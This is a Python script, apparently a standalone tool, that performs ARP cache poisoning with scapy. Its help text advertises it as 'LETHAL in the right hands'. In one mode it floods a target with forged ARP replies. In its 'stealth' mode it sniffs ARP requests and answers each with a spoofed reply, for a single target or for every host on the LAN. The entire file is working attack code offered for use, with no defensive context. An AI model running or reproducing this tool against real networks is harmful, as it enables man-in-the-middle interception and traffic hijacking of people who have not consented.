# Requires Root permissions to form raw packets.

import sys
import time
import argparse
from scapy.all import sendp, ARP, Ether, sniff

stealth = False
if "-S" in sys.argv or "--stealth" in sys.argv:
    stealth = True

parser = argparse.ArgumentParser(description="A Simple Python ARP Cache poisoning, LETHAL in the right hands!")

parser.add_argument("-t","--target_ip",help="IP Address of the Target/ If in stealth mode, poison will only reply to packets from this IP",required = not stealth,metavar="",type=str)
parser.add_argument("-f","--fake_ip",help="(Required)IP Address you want to make as the source of this packet",required=not stealth,metavar="",type=str)
parser.add_argument("-i","--interface",help="(Required)Interface you want to send packets on and sniff on.",required = True,metavar="",type=str)

group = parser.add_mutually_exclusive_group()
group.add_argument("-S","--stealth",action='store_true',help="Do you want to poison ARP Cache in Stealth Mode? / You can provide a target to poison or just poison all hosts in your LAN")
group.add_argument("-d","--interval",help="Packet Interval/Optional in case of Noisy ARP Poisoning",type=int,default=2)

args = parser.parse_args()

def callback(packet):
    process = False
    if packet[ARP].op == 1:
        process = True
        if args.target_ip is not None:
            if packet[ARP].psrc != args.target_ip:
                process = False
    if process :
        print(f"""
            Received New Packet : \n
            Packet Destination : {packet[ARP].pdst}\n
            Packet Source : {packet[ARP].psrc} \n
            Packet OP : {packet[ARP].op} \n
        """)
        ether = Ether(dst = packet[ARP].hwsrc)
        arp = ARP()
        answer = ether/arp
        answer[ARP].pdst = packet[ARP].psrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].op = "is-at"
        sendp(answer,iface=args.interface)
        print(f"Send ARP Reply to {packet[ARP].psrc} disguised as {packet[ARP].pdst}.")

def main(args):

    if not args.stealth:
        ether = Ether()
        arp = ARP(pdst=args.target_ip,psrc=args.fake_ip,op="is-at")
        packet = ether/arp
        print(f"Sending Packets at interval of {args.interval} seconds")
        while True:
            sendp(packet,iface=args.interface,verbose=0)
            time.sleep(2)

    else :
        sniff(
            prn = callback,
            filter = 'arp',
            iface = args.interface,
            store = 0
        )        

if __name__ == "__main__":
    mode = "Stealth" if args.stealth else "Noisy"
    print(f"Poisoning in {mode} mode \n")
    if stealth and args.target_ip is None:
        target_stat = "all"
    else:
        target_stat = args.target_ip
    print(f"Target IP : {target_stat}")
    print(f"Fake IP : {args.fake_ip}")
    print(f"Interface : {args.interface}")

    main(args)
